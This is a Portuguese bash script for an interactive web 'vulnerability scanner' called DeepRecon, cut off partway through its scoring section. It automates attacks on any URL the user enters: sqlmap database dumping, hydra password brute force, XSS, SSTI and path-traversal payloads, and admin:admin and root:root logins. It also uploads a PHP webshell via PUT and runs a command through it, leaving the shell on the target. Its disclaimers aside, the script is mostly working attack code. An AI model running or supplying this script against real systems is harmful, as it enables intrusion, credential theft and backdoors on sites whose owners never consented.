#!/bin/bash

# ============================================================
# DeepRecon v1.0 - Varredura completa de vulnerabilidades
# Uso: ./DeepRecon (menu interativo)
# Modos: 1 - Alvo unico | 2 - Multiplos alvos | 3 - Arquivo de alvos
# ============================================================
# AVISO LEGAL:
# Ao usar este scanner, o usuario assume total responsabilidade
# pelo uso das informacoes obtidas. O desenvolvedor NAO se
# responsabiliza por qualquer dano ou uso indevido.
# Use apenas em sistemas que voce tem autorizacao.
# ============================================================

RED='\033[1;31m'
GREEN='\033[1;32m'
YELLOW='\033[1;33m'
CYAN='\033[1;36m'
MAGENTA='\033[1;35m'
RESET='\033[0m'
BOLD='\033[1m'

# ============================================================
# BANNER
# ============================================================
clear
echo -e "${MAGENTA}${BOLD}"
echo "   ____                     ____                     "
echo "  / __ \___  ___  ____     / __ \___  _________  ____"
echo " / / / / _ \/ _ \/ __ \   / /_/ / _ \/ ___/ __ \/ __ \\"
echo "/ /_/ /  __/  __/ /_/ /  / _, _/  __/ /__/ /_/ / / / /"
echo "\_____/\___/\___/ .___/  /_/ |_|\___/\___/\____/_/ /_/"
echo "               /_/                                     "
echo -e "${RESET}"
echo ""

# ============================================================
# TERMOS DE USO
# ============================================================
echo -e "${YELLOW}${BOLD}╔══════════════════════════════════════════════════╗${RESET}"
echo -e "${YELLOW}${BOLD}║              TERMOS DE USO - DeepRecon            ║${RESET}"
echo -e "${YELLOW}${BOLD}╠══════════════════════════════════════════════════╣${RESET}"
echo -e "${YELLOW}${BOLD}║${RESET}"
echo -e "${YELLOW}${BOLD}║${RESET}  Ao utilizar o DeepRecon, voce concorda que:"
echo -e "${YELLOW}${BOLD}║${RESET}"
echo -e "${YELLOW}${BOLD}║${RESET}  1. ${BOLD}RESPONSABILIDADE:${RESET} O uso deste scanner"
echo -e "${YELLOW}${BOLD}║${RESET}     e de inteira responsabilidade do usuario."
echo -e "${YELLOW}${BOLD}║${RESET}"
echo -e "${YELLOW}${BOLD}║${RESET}  2. ${BOLD}NAO NOS RESPONSABILIZAMOS${RESET} por qualquer"
echo -e "${YELLOW}${BOLD}║${RESET}     dano, perda de dados, ou problemas legais"
echo -e "${YELLOW}${BOLD}║${RESET}     decorrentes do uso desta ferramenta."
echo -e "${YELLOW}${BOLD}║${RESET}"
echo -e "${YELLOW}${BOLD}║${RESET}  3. Use apenas em sistemas que ${BOLD}VOCE POSSUI${RESET}"
echo -e "${YELLOW}${BOLD}║${RESET}     ou tem ${BOLD}AUTORIZACAO EXPLICITA${RESET} por escrito."
echo -e "${YELLOW}${BOLD}║${RESET}"
echo -e "${YELLOW}${BOLD}║${RESET}  4. ${BOLD}PRIVACIDADE:${RESET} Nenhum dado e coletado"
echo -e "${YELLOW}${BOLD}║${RESET}     ou enviado. Tudo roda localmente na maquina."
echo -e "${YELLOW}${BOLD}║${RESET}"
echo -e "${YELLOW}${BOLD}║${RESET}  5. Ao continuar, voce aceita estes termos."
echo -e "${YELLOW}${BOLD}╚══════════════════════════════════════════════════╝${RESET}"
echo ""
echo -e "${BOLD}Ao continuar, voce aceita os termos acima.${RESET}"
echo -ne "${YELLOW}Digite ${GREEN}S${RESET}${YELLOW} para aceitar ou ${RED}N${RESET}${YELLOW} para sair: ${RESET}"
read -r ACEITA
if [[ "$ACEITA" != "S" && "$ACEITA" != "s" ]]; then
  echo -e "${RED}Termos nao aceitos. Saindo.${RESET}"
  exit 1
fi

# ============================================================
# SELECAO DE MODO: ALVO UNICO OU MULTIPLOS ALVOS
# ============================================================
ALVOS=()
echo ""
echo -e "${BOLD}Selecione o modo de scan:${RESET}"
echo -e "  ${GREEN}[1]${RESET} Alvo unico"
echo -e "  ${GREEN}[2]${RESET} Multiplos alvos"
echo -e "  ${GREEN}[3]${RESET} Arquivo de alvos (-f)"
echo ""
printf "${YELLOW}Escolha (1/2/3): ${RESET}"
read -r MODO

case $MODO in
  1)
    printf "${YELLOW}Digite a URL do alvo: ${RESET}"
    read -r URL
    echo "$URL" | grep -qE '^https?://' || URL="http://$URL"
    ALVOS+=("$URL")
    ;;
  2)
    printf "${YELLOW}Digite as URLs (separadas por espaco): ${RESET}"
    read -ra ALVOS_USER
    for url in "${ALVOS_USER[@]}"; do
      [ -n "$url" ] && {
        echo "$url" | grep -qE '^https?://' || url="http://$url"
        ALVOS+=("$url")
      }
    done
    ;;
  3)
    printf "${YELLOW}Caminho do arquivo: ${RESET}"
    read -r ARQUIVO
    if [ ! -f "$ARQUIVO" ]; then
      echo -e "${RED}Arquivo nao encontrado: $ARQUIVO${RESET}"
      exit 1
    fi
    while IFS= read -r url || [ -n "$url" ]; do
      url=$(echo "$url" | xargs)
      [ -n "$url" ] && [[ "$url" != \#* ]] && {
        echo "$url" | grep -qE '^https?://' || url="http://$url"
        ALVOS+=("$url")
      }
    done < "$ARQUIVO"
    ;;
  *)
    echo -e "${RED}Opcao invalida. Abortando.${RESET}"
    exit 1
    ;;
esac

if [ ${#ALVOS[@]} -eq 0 ]; then
  echo -e "${RED}Nenhuma URL informada. Abortando.${RESET}"
  exit 1
fi

# ============================================================
# VERIFICA E INSTALA FERRAMENTAS
# ============================================================
clear
FERRAMENTAS=("nmap" "whatweb" "nikto" "sqlmap" "ffuf" "subfinder" "amass" "gobuster" "wpscan" "sslscan" "wafw00f" "commix" "dnsrecon" "dnsenum" "hydra" "wfuzz" "searchsploit" "curl" "whois")
echo -e "${YELLOW}${BOLD}╔══════════════════════════════════════════════════╗${RESET}"
echo -e "${YELLOW}${BOLD}║        Verificando ferramentas instaladas       ║${RESET}"
echo -e "${YELLOW}${BOLD}╚══════════════════════════════════════════════════╝${RESET}"
echo ""
INSTALADAS=0
FALTANDO=0
FALTAM_LISTA=""
for cmd in "${FERRAMENTAS[@]}"; do
  if command -v "$cmd" &>/dev/null; then
    echo -e "  ${GREEN}[ok]${RESET} $cmd"
    INSTALADAS=$((INSTALADAS + 1))
  else
    echo -e "  ${RED}[falta]${RESET} $cmd"
    FALTANDO=$((FALTANDO + 1))
    FALTAM_LISTA="$FALTAM_LISTA $cmd"
  fi
done
echo ""
echo -e "  ${GREEN}$INSTALADAS instaladas${RESET} | ${RED}$FALTANDO faltando${RESET}"
if [ "$FALTANDO" -gt 0 ]; then
  echo ""
  echo -e "${YELLOW}Deseja instalar as ferramentas faltando? (S/n)${RESET}"
  read -r INSTALA
  if [[ "$INSTALA" != "n" && "$INSTALA" != "N" ]]; then
    echo -e "${CYAN}Instalando ferramentas faltando...${RESET}"
    sudo apt-get update -qq 2>/dev/null
    for cmd in $FALTAM_LISTA; do
      echo -e "  ${YELLOW}Instalando $cmd...${RESET}"
      sudo apt-get install -y -qq "$cmd" 2>/dev/null
      if command -v "$cmd" &>/dev/null; then
        echo -e "  ${GREEN}[ok]${RESET} $cmd instalado"
        INSTALADAS=$((INSTALADAS + 1))
        FALTANDO=$((FALTANDO - 1))
      else
        echo -e "  ${RED}[falhou]${RESET} $cmd nao foi instalado"
      fi
    done
    echo ""
    echo -e "  ${GREEN}$INSTALADAS instaladas${RESET} | ${RED}$FALTANDO faltando${RESET}"
  fi
fi
echo -e "  ${YELLOW}Ferramentas faltando serao puladas.${RESET}"
echo ""
echo -e "${CYAN}${BOLD}╔══════════════════════════════════════════════════╗${RESET}"
echo -e "${CYAN}${BOLD}║              Alvos: ${#ALVOS[@]} site(s)                      ║${RESET}"
echo -e "${CYAN}${BOLD}╚══════════════════════════════════════════════════╝${RESET}"
for i in "${!ALVOS[@]}"; do
  echo -e "  ${BOLD}[$((i+1))]${RESET} ${ALVOS[$i]}"
done
echo ""
sleep 3

# ============================================================
# LOOP PRINCIPAL - PARA CADA ALVO
# ============================================================
for ALVO in "${ALVOS[@]}"; do

DOMINIO=$(echo "$ALVO" | sed 's|https\?://||' | cut -d/ -f1 | cut -d: -f1)
PROTOCOLO=$(echo "$ALVO" | grep -q 'https' && echo "https" || echo "http")
REPORT="/tmp/DeepRecon_${DOMINIO}_$(date +%Y%m%d_%H%M%S).txt"
> "$REPORT"

TOTAL_PASSOS=24
PASSO_ATUAL=0

progresso() {
  PASSO_ATUAL=$((PASSO_ATUAL + 1))
  PERCENT=$((PASSO_ATUAL * 100 / TOTAL_PASSOS))
  echo -e "\n${CYAN}[${PERCENT}%] ${1}${RESET}"
}

info() {
  echo -e "  ${GREEN}[+] $1${RESET}"
}

aviso() {
  echo -e "  ${YELLOW}[!] $1${RESET}"
  echo -e "[ALERTA] $1" >> "$REPORT"
}

critico() {
  echo -e "  ${RED}[!!] $1${RESET}"
  echo -e "[CRITICO] $1" >> "$REPORT"
}

# ============================================================
echo ""
echo -e "${MAGENTA}${BOLD}╔══════════════════════════════════════════════════╗${RESET}"
echo -e "${MAGENTA}${BOLD}║        DEEPRECON v1.0 - Scanner Web              ║${RESET}"
echo -e "${MAGENTA}${BOLD}╠══════════════════════════════════════════════════╣${RESET}"
echo -e "${MAGENTA}${BOLD}║${RESET}  ${BOLD}Alvo:${RESET}      ${CYAN}$ALVO${RESET}"
echo -e "${MAGENTA}${BOLD}║${RESET}  ${BOLD}IP:${RESET}        ${CYAN}$(host "$DOMINIO" 2>/dev/null | awk '/has address/{print $NF; exit}')${RESET}"
echo -e "${MAGENTA}${BOLD}║${RESET}  ${BOLD}Data:${RESET}      $(date '+%d/%m/%Y %H:%M:%S')"
echo -e "${MAGENTA}${BOLD}║${RESET}  ${BOLD}Relatorio:${RESET} ${CYAN}$REPORT${RESET}"
echo -e "${MAGENTA}${BOLD}╚══════════════════════════════════════════════════╝${RESET}"
echo ""

# ===== PASSO 1: WAF =====
progresso "WAFW00F - Detectando firewall"
if command -v wafw00f &>/dev/null; then
  wafw00f "$ALVO" 2>/dev/null | while read -r line; do
    if echo "$line" | grep -qi "behind"; then
      critico "WAF detectado: $(echo "$line" | cut -d: -f2-)"
    fi
  done
fi

# ===== PASSO 2: HEADERS =====
progresso "Analisando headers de seguranca"
HEADERS=$(curl -sI -L "$ALVO" 2>/dev/null)
echo "$HEADERS" | head -25
echo ""
echo "$HEADERS" | grep -qi "strict-transport-security" || aviso "Falta HSTS"
echo "$HEADERS" | grep -qi "x-frame-options" || critico "Falta X-Frame-Options - Clickjacking!"
echo "$HEADERS" | grep -qi "x-content-type-options" || aviso "Falta X-Content-Type-Options"
echo "$HEADERS" | grep -qi "content-security-policy" || aviso "Falta CSP"
echo "$HEADERS" | grep -qi "x-xss-protection" || aviso "Falta X-XSS-Protection"
echo "$HEADERS" | grep -i "^set-cookie:" | grep -vi "secure" && aviso "Cookie sem flag Secure"

# ===== PASSO 3: WHATWEB =====
progresso "WhatWeb - Identificando tecnologias"
if command -v whatweb &>/dev/null; then
  whatweb -a 3 "$ALVO" 2>/dev/null
fi

# ===== PASSO 4: SSL =====
progresso "SSLScan - Verificando SSL/TLS"
if [ "$PROTOCOLO" = "https" ] && command -v sslscan &>/dev/null; then
  sslscan "$DOMINIO" 2>/dev/null | grep -iE "weak|error|heartbleed|poodle|rc4|cbc|tlsv1\.[01]" | head -15
  if sslscan "$DOMINIO" 2>/dev/null | grep -qi "heartbleed"; then
    critico "VULNERAVEL A HEARTBLEED!"
  fi
  echo | openssl s_client -connect "${DOMINIO}:443" -servername "$DOMINIO" 2>/dev/null | openssl x509 -noout -subject -dates 2>/dev/null
fi

# ===== PASSO 5: SUBDOMINIOS =====
progresso "Subfinder - Descobrindo subdominios"
if command -v subfinder &>/dev/null; then
  subfinder -d "$DOMINIO" -silent 2>/dev/null | head -20
fi
if command -v amass &>/dev/null; then
  amass enum -d "$DOMINIO" -passive -timeout 30 2>/dev/null | head -20
fi

# ===== PASSO 6: NMAP =====
progresso "Nmap - Escaneando portas"
if command -v nmap &>/dev/null; then
  nmap --top-ports 100 -T4 --open -sV "$DOMINIO" 2>/dev/null | grep -E '^[0-9]|PORT|SERVICE|VERSION' | head -30
  echo ""
  nmap -sV --script=http-title,http-server-header,http-headers "$DOMINIO" 2>/dev/null | grep -E 'title|Server|Header' | head -10
fi

# ===== PASSO 7: GOBUSTER =====
progresso "Gobuster - Descobrindo diretorios"
if command -v gobuster &>/dev/null; then
  WORDLIST="/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt"
  [ ! -f "$WORDLIST" ] && WORDLIST="/usr/share/wordlists/dirb/common.txt"
  if [ -f "$WORDLIST" ]; then
    gobuster dir -u "$ALVO" -w "$WORDLIST" -t 30 -q -s 200,301,302,403,401 -x php,txt,html,bak,zip,tar,sql,json,xml 2>/dev/null | head -50
  fi
fi

# ===== PASSO 8: ARQUIVOS SENSIVEIS =====
progresso "Procurando arquivos sensiveis"
for path in admin login backup wp-admin config .git .env .htaccess .svn phpinfo.php test.php info.php debug.php console painel dashboard painel administrativo xmlrpc.php wp-config.php.bak wp-config.php~ dump.sql database.sql server-status server-info crossdomain.xml; do
  body_code=$(curl -s -L --max-time 3 -o /tmp/.deeprecon_body -w "%{http_code}" "$ALVO/$path" 2>/dev/null)
  body=$(cat /tmp/.deeprecon_body 2>/dev/null | head -c 500)
  if [ "$body_code" != "000" ]; then
    if [ "$body_code" = "200" ]; then
      case "$path" in
        admin|login|wp-admin|painel|dashboard|administrativo|console)
          has_content=$(echo "$body" | grep -ciE "<html|<body|<form|<div|<input" 2>/dev/null)
          has_cookie=$(echo "$body" | grep -ci "set_cookie\|begetok\|location.reload" 2>/dev/null)
          [ "$has_content" -gt 2 ] && [ "$has_cookie" -eq 0 ] && critico "ACESSO LIVRE: $ALVO/$path (HTTP $body_code)"
          [ "$has_content" -gt 0 ] && [ "$has_cookie" -gt 0 ] && aviso "POSSIVEL FALSO POSITIVO: $ALVO/$path (so seta cookie)"
          [ "$has_content" -le 2 ] && [ "$has_cookie" -eq 0 ] && aviso "ACESSO LIVRE: $ALVO/$path (pouco conteudo)"
          ;;
        .git) echo "$body" | grep -qi "\[core\]" && critico "REPOSITORIO GIT EXPOSTO: $ALVO/$path" ;;
        .env) echo "$body" | grep -qi "DB_\|APP_\|SECRET\|PASSWORD\|KEY\|API" && critico "ARQUIVO .ENV EXPOSTO: $ALVO/$path" ;;
        wp-config.php.bak|wp-config.php~) echo "$body" | grep -qi "DB_NAME\|DB_USER\|DB_PASSWORD\|WP_\|define" && critico "BACKUP WP-CONFIG: $ALVO/$path" ;;
        dump.sql|database.sql) echo "$body" | grep -qi "CREATE TABLE\|INSERT INTO\|DROP TABLE\|--\|DELETE FROM" && critico "BACKUP BD: $ALVO/$path" ;;
        phpinfo.php|info.php|test.php|debug.php) echo "$body" | grep -qi "phpinfo\|PHP Version\|PHP License\|php version" && critico "INFO PHP EXPOSTA: $ALVO/$path" ;;
        crossdomain.xml) echo "$body" | grep -qi "allow-access-from" && aviso "CROSSDOMAIN.XML: $ALVO/$path permite acesso externo" ;;
        config) echo "$body" | grep -qi "DB_\|PASSWORD\|SECRET\|KEY\|HOST\|USER" && critico "CONFIG EXPOSTO: $ALVO/$path" ;;
        backup) echo "$body" | grep -qi "backup\|directory\|\.sql\|\.bak\|dump" && aviso "DIRETORIO DE BACKUP: $ALVO/$path" ;;
        *) echo "$body" | grep -qi "set_cookie\|begetok\|location.reload" && aviso "POSSIVEL FALSO POSITIVO: $ALVO/$path (so seta cookie)" || critico "ACESSO LIVRE: $ALVO/$path (HTTP $body_code)" ;;
      esac
    elif [ "$body_code" = "403" ]; then
      aviso "ACESSO RESTRITO: $ALVO/$path (HTTP $body_code)"
    elif [ "$body_code" = "401" ]; then
      aviso "AUTENTICACAO REQUERIDA: $ALVO/$path (HTTP $body_code)"
    fi
  fi
done
rm -f /tmp/.deeprecon_body 2>/dev/null

# ===== PASSO 9: SQLMAP =====
progresso "SQLMap - Testando SQL Injection"
if command -v sqlmap &>/dev/null; then
  PARAM=$(curl -s "$ALVO" 2>/dev/null | grep -oP '(?<=\?)[a-z]+(?==)' | head -1)
  SQLI_ACHOU=0
  if [ -n "$PARAM" ]; then
    info "Parametro GET: $PARAM"
    SQLI_RESULT=$(sqlmap -u "${ALVO}?${PARAM}=1" --batch --level=2 --risk=2 --time-sec=5 --dbs 2>/dev/null)
    if echo "$SQLI_RESULT" | grep -qi "vulnerable"; then
      critico "SQL INJECTION DETECTADA em ?$PARAM"
      SQLI_ACHOU=1
    fi
  fi
  if command -v sqlmap &>/dev/null; then
    SQLI_FORMS=$(sqlmap -u "$ALVO" --crawl=1 --batch --forms --level=2 --risk=2 --time-sec=5 2>/dev/null)
    if echo "$SQLI_FORMS" | grep -qi "vulnerable"; then
      critico "SQL INJECTION DETECTADA em formulario!"
      SQLI_ACHOU=1
    fi
  fi
  # Testa SQL Injection em cookies e headers
  COOKIE=$(curl -sI "$ALVO" 2>/dev/null | grep -i "^set-cookie:" | head -1 | sed 's/.*: //' | cut -d';' -f1)
  if [ -n "$COOKIE" ]; then
    SQLI_COOKIE=$(sqlmap -u "$ALVO" --cookie="$COOKIE=1'" --batch --level=3 --risk=2 2>/dev/null)
    if echo "$SQLI_COOKIE" | grep -qi "vulnerable"; then
      critico "SQL INJECTION DETECTADA em cookie!"
      SQLI_ACHOU=1
    fi
  fi
  if [ "$SQLI_ACHOU" -eq 0 ]; then
    info "Nenhuma SQL Injection encontrada nos testes basicos"
  fi
fi

# ===== PASSO 10: COMMIX =====
progresso "Commix - Testando Command Injection"
if command -v commix &>/dev/null; then
  PARAM=$(curl -s "$ALVO" 2>/dev/null | grep -oP '(?<=\?)[a-z]+(?==)' | head -1)
  if [ -n "$PARAM" ]; then
    commix --url="${ALVO}?${PARAM}=1" --batch --level=1 2>/dev/null | grep -iE "vulnerable|injection|Confidence|Payload" | head -10
  fi
fi

# ===== PASSO 11: FFUF =====
progresso "FFUF - Forca bruta de diretorios"
if command -v ffuf &>/dev/null; then
  WL="/usr/share/wordlists/dirb/common.txt"
  if [ -f "$WL" ]; then
    ffuf -u "$ALVO/FUZZ" -w "$WL" -t 30 -c -s -fc 404,403 2>/dev/null | head -40
  fi
fi

# ===== PASSO 12: WFUZZ =====
progresso "WFuzz - Fuzzing de parametros"
if command -v wfuzz &>/dev/null; then
  PARAM=$(curl -s "$ALVO" 2>/dev/null | grep -oP '(?<=\?)[a-z]+(?==)' | head -1)
  if [ -n "$PARAM" ]; then
    wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt -u "${ALVO}?FUZZ=1" --hc 404 2>/dev/null | head -15
  fi
fi

# ===== PASSO 13: NIKTO =====
progresso "Nikto - Varredura de vulnerabilidades"
if command -v nikto &>/dev/null; then
  if [ "$PROTOCOLO" = "https" ]; then
    nikto -h "$ALVO" -ssl -timeout 10 -no404 2>/dev/null | grep -iE "OSVDB|vulnerable|vuln|click|XSS|SQL|path|disclosure|error|backup|interesting|account|upload|exec|shell|injection" | head -30
  else
    nikto -h "$ALVO" -timeout 10 -no404 2>/dev/null | grep -iE "OSVDB|vulnerable|vuln|click|XSS|SQL|path|disclosure|error|backup|interesting|account|upload|exec|shell|injection" | head -30
  fi
fi

# ===== PASSO 14: WPSCAN =====
progresso "WPScan - WordPress"
if command -v wpscan &>/dev/null; then
  wpscan --url "$ALVO" --no-update --api-token '' 2>/dev/null | grep -iE "WordPress|theme|plugin|vulnerability|identified|User|admin" | head -15
fi

# ===== PASSO 15: HYDRA =====
progresso "Hydra - Testando senhas (admin)"
if command -v hydra &>/dev/null; then
  if echo "$ALVO" | grep -qE 'login|admin|painel'; then
    hydra -l admin -P /usr/share/wordlists/fasttrack.txt "$DOMINIO" http-get / 2>/dev/null | head -10
  fi
fi

# ===== PASSO 16: DNSRECON =====
progresso "DNSRecon - Info DNS"
if command -v dnsrecon &>/dev/null; then
  dnsrecon -d "$DOMINIO" 2>/dev/null | grep -iE "A |AAAA|MX|NS|SOA|TXT" | head -15
fi

# ===== PASSO 17: WHOIS =====
progresso "Whois - Info do dominio"
if command -v whois &>/dev/null; then
  whois "$DOMINIO" 2>/dev/null | grep -iE "Registrant|Creation|Expir|Name Server|Owner" | head -10
fi

# ===== PASSO 18: SEARCHSPLOIT =====
progresso "SearchSploit - Buscando exploits"
if command -v searchsploit &>/dev/null; then
  SERVER=$(curl -sI "$ALVO" 2>/dev/null | grep -i "^server:" | sed 's/.*: //')
  [ -n "$SERVER" ] && searchsploit "$SERVER" 2>/dev/null | grep -i "vulnerability\|exploit" | head -10
fi

# ===== PASSO 19: METODOS HTTP =====
progresso "Verificando metodos HTTP"
curl -s -X OPTIONS -I -L "$ALVO" 2>/dev/null | grep -i "allow:" | head -5
PUT_CODE=$(curl -s -L -X PUT -d "test" "$ALVO/test.txt" -o /dev/null -w "%{http_code}" 2>/dev/null)
echo "$PUT_CODE" | grep -qE "200|201|204" && critico "Metodo PUT habilitado! (HTTP $PUT_CODE)"

# ===== PASSO 20: SERVICOS COMUNS =====
progresso "Procurando servicos comuns"
for srv in cgi-bin/ cgi-bin/test.cgi server-status server-info phpMyAdmin phpmyadmin phppgadmin adminer.php mysql phpinfo.php info.php; do
  body_code=$(curl -s -L --max-time 3 -o /tmp/.deeprecon_srv -w "%{http_code}" "$ALVO/$srv" 2>/dev/null)
  if [ "$body_code" = "200" ]; then
    body=$(cat /tmp/.deeprecon_srv 2>/dev/null)
    case "$srv" in
      phpMyAdmin|phpmyadmin) echo "$body" | grep -qi "phpmyadmin\|phpMyAdmin" && critico "SERVICO ENCONTRADO: $ALVO/$srv" ;;
      phppgadmin) echo "$body" | grep -qi "phppgadmin\|PostgreSQL" && critico "SERVICO ENCONTRADO: $ALVO/$srv" ;;
      adminer.php) echo "$body" | grep -qi "adminer\|Adminer" && critico "SERVICO ENCONTRADO: $ALVO/$srv" ;;
      phpinfo.php|info.php) echo "$body" | grep -qi "phpinfo\|PHP Version\|php version\|PHP License" && critico "SERVICO ENCONTRADO: $ALVO/$srv" ;;
      mysql) echo "$body" | grep -qi "mysql\|MySQL\|phpMyAdmin" && critico "SERVICO ENCONTRADO: $ALVO/$srv" ;;
      server-status) echo "$body" | grep -qi "server status\|Apache.*Server\|nginx.*status" && critico "SERVICO ENCONTRADO: $ALVO/$srv" ;;
      server-info) echo "$body" | grep -qi "server info\|Apache.*Server" && critico "SERVICO ENCONTRADO: $ALVO/$srv" ;;
      cgi-bin/test.cgi) echo "$body" | grep -qi "cgi\|content-type" && critico "SERVICO ENCONTRADO: $ALVO/$srv" ;;
    esac
  fi
done
rm -f /tmp/.deeprecon_srv 2>/dev/null

# ===== PASSO 21: CVE CHECK =====
progresso "Verificando versoes antigas"
SERVER=$(curl -sI "$ALVO" 2>/dev/null | grep -i "^server:" | sed 's/.*: //')
echo "$SERVER" | grep -qi "apache/2\.[0123]\|apache/1\." && critico "Apache versao antiga!"
echo "$SERVER" | grep -qi "nginx/1\.[0-9]" && critico "Nginx versao antiga!"
echo "$SERVER" | grep -qi "php/5\.[0-6]" && critico "PHP versao antiga!"
echo "$SERVER" | grep -qi "iis/6\|iis/7" && critico "IIS versao antiga!"

# ===== PASSO 22: EXPLORACAO AGRESSIVA =====
progresso "Exploracao agressiva - testando invasao"
info "Testando XSS refleto..."
XSS_PAYLOADS=("<script>alert(1)</script>" "\"><script>alert(1)</script>" "'><script>alert(1)</script>")
for param in $(curl -s "$ALVO" 2>/dev/null | tr "'" '"' | grep -oP 'name="?\K[a-z_][a-zA-Z0-9_]*' | sort -u | head -5); do
  for payload in "${XSS_PAYLOADS[@]}"; do
    code=$(curl -s -o /dev/null -w "%{http_code}" --max-time 3 "${ALVO}?${param}=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))" 2>/dev/null)" 2>/dev/null)
    [ "$code" = "200" ] && aviso "Possivel XSS: $ALVO?$param=$payload"
  done
done

info "Testando path traversal..."
for path in "../../../etc/passwd" "../../etc/passwd" "../etc/passwd" "..\\..\\..\\windows\\win.ini"; do
  body=$(curl -s --max-time 3 "$ALVO/$path" 2>/dev/null)
  echo "$body" | grep -qi "root:\|\[extensions\]" && critico "PATH TRAVERSAL: $ALVO/$path expoe arquivos do sistema!"
done

info "Testando exposicao de .git..."
GIT_URL=$(curl -s --max-time 3 "$ALVO/.git/config" 2>/dev/null)
echo "$GIT_URL" | grep -qi "\[core\]" && critico "REPOSITORIO GIT EXPOSTO: $ALVO/.git/config baixavel!"

info "Testando exposicao de .env..."
ENV_CONTENT=$(curl -s --max-time 3 "$ALVO/.env" 2>/dev/null)
echo "$ENV_CONTENT" | grep -qi "DB_\|APP_\|SECRET\|PASSWORD\|KEY" && critico "ARQUIVO .ENV EXPOSTO com credenciais!"

info "Testando CORS misconfiguration..."
CORS_HEADER=$(curl -s -I -H "Origin: https://malicious.com" --max-time 3 "$ALVO" 2>/dev/null | grep -i "^access-control-allow-origin:")
echo "$CORS_HEADER" | grep -qi "malicious" && critico "CORS MISCONFIG: Access-Control-Allow-Origin reflete qualquer origem!"

info "Testando default credentials..."
for path in admin login wp-admin painel dashboard administrador; do
  SEM_AUTH=$(curl -s -L --max-time 3 -o /dev/null -w "%{http_code}" "$ALVO/$path" 2>/dev/null)
  COM_AUTH_ADMIN=$(curl -s -L --max-time 3 -u "admin:admin" -o /dev/null -w "%{http_code}" "$ALVO/$path" 2>/dev/null)
  COM_AUTH_ROOT=$(curl -s -L --max-time 3 -u "root:root" -o /dev/null -w "%{http_code}" "$ALVO/$path" 2>/dev/null)
  if [ "$SEM_AUTH" != "$COM_AUTH_ADMIN" ] && [ "$COM_AUTH_ADMIN" = "200" ]; then
    critico "DEFAULT CREDENTIALS: admin:admin funciona em $ALVO/$path!"
  fi
  if [ "$SEM_AUTH" != "$COM_AUTH_ROOT" ] && [ "$COM_AUTH_ROOT" = "200" ]; then
    critico "DEFAULT CREDENTIALS: root:root funciona em $ALVO/$path!"
  fi
done

info "Testando open redirect..."
REDIR_TEST=$(curl -s -L -o /dev/null -w "%{url_effective}" --max-time 3 "${ALVO}?redirect=http://evil.com&url=http://evil.com&next=http://evil.com&return=http://evil.com" 2>/dev/null)
echo "$REDIR_TEST" | grep -qvi "$DOMINIO" && [ -n "$REDIR_TEST" ] && critico "OPEN REDIRECT: redireciona para dominio externo ($REDIR_TEST)"

info "Testando SSTI (Server-Side Template Injection)..."
SSTI_PAYLOADS=("{{7*7}}" "\${7*7}" "<%= 7*7 %>" "#{7*7}" "*{7*7}")
for payload in "${SSTI_PAYLOADS[@]}"; do
  SSTI_RESULT=$(curl -s --max-time 3 "${ALVO}?name=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))" 2>/dev/null)" 2>/dev/null)
  echo "$SSTI_RESULT" | grep -q "49" && aviso "Possivel SSTI: $ALVO?name=$payload (retornou 49)"
done

info "Testando upload de webshell via PUT..."
PUT_TEST=$(curl -s -L -X PUT -d "<?php system(\$_GET['cmd']); ?>" "$ALVO/shell.php" -o /dev/null -w "%{http_code}" 2>/dev/null)
if [ "$PUT_TEST" = "200" ] || [ "$PUT_TEST" = "201" ] || [ "$PUT_TEST" = "204" ]; then
  critico "WEBSHELL UPLOAD: PUT $ALVO/shell.php funcionou! ($PUT_TEST)"
  CHECK_SHELL=$(curl -s -L --max-time 3 "$ALVO/shell.php?cmd=id" 2>/dev/null)
  echo "$CHECK_SHELL" | grep -qi "uid=" && critico "WEBSHELL ACESSAVEL: $ALVO/shell.php?cmd=id"
fi

info "Verificando phpinfo exposto..."
PHPINFO=$(curl -s --max-time 3 "$ALVO/phpinfo.php" 2>/dev/null)
echo "$PHPINFO" | grep -qi "PHP Version\|phpinfo()" && critico "PHPINFO EXPOSTO: $ALVO/phpinfo.php vaza configuracoes do PHP!"

info "Verificando backup files expostos..."
for bak in .bak .old .swp ~ .save backup.sql dump.sql db.sql config.php.bak; do
  BAK_CODE=$(curl -s -o /dev/null -w "%{http_code}" --max-time 3 "$ALVO/config.php$bak" 2>/dev/null)
  [ "$BAK_CODE" = "200" ] && critico "BACKUP EXPOSTO: $ALVO/config.php$bak"
done

# ===== PASSO 23: IA BRAIN - ANALISE INTELIGENTE =====
progresso "IA Brain - Processando achados com motor de correlacao"
REPORT_TEXT=$(cat "$REPORT" 2>/dev/null)

# Pontuacao base por tipo de achado (impacto + probabilidade)
declare -A SCORES
SCORES["SQL INJECTION"]=95
SCORES["PATH TRAVERSAL"]=90
SCORES["WEBSHELL UPLOAD"]=100
SCORES["REPOSITORIO GIT EXPOSTO"]=80
SCORES["ARQUIVO .ENV EXPOSTO"]=85
SCORES["DEFAULT CREDENTIALS"]=90
SCORES["OPEN REDIRECT"]=40
SCORES["Metodo PUT habilitado"]=70
SCORES["PHPINFO EXPOSTO"]=50
SCORES["BACKUP WP-CONFIG"]=75
SCORES["BACKUP BD"]=75
SCORES["CONFIG EXPOSTO"]=80
SCORES["BACKUP EXPOSTO"]=65
SCORES["SERVICO ENCONTRADO"]=40
SCORES["CROSSDOMAIN.XML"]=35
SCORES["Falta X-Frame-Options"]=45
SCORES["Falta HSTS"]=25
SCORES["Falta CSP"]=30
SCORES["Falta X-Content-Type-Options"]=20
SCORES["Falta X-XSS-Protection"]=20
SCORES["Cookie sem flag Secure"]=35
SCORES["WAF detectado"]=10
SCORES["ALTA PRIORIDADE"]=50

# Correlacao: deteccao de cadeias de ataque
CORRELATION_WEIGHT=0
ATTACK_CHAINS=()

sql_detect=$(echo "$REPORT_TEXT" | grep -c "SQL INJECTION")
git_detect=$(echo "$REPORT_TEXT" | grep -c "REPOSITORIO GIT EXPOSTO")
env_detect=$(echo "$REPORT_TEXT" | grep -c "ARQUIVO .ENV EXPOSTO")
put_detect=$(echo "$REPORT_TEXT" | grep -c "Metodo PUT habilitado\|WEBSHELL")
config_detect=$(echo "$REPORT_TEXT" | grep -c "CONFIG EXPOSTO\|wp-config\|BACKUP BD")
default_creds=$(echo "$REPORT_TEXT" | grep -c "DEFAULT CREDENTIALS")
x_frame=$(echo "$REPORT_TEXT" | grep -c "Falta X-Frame-Options")
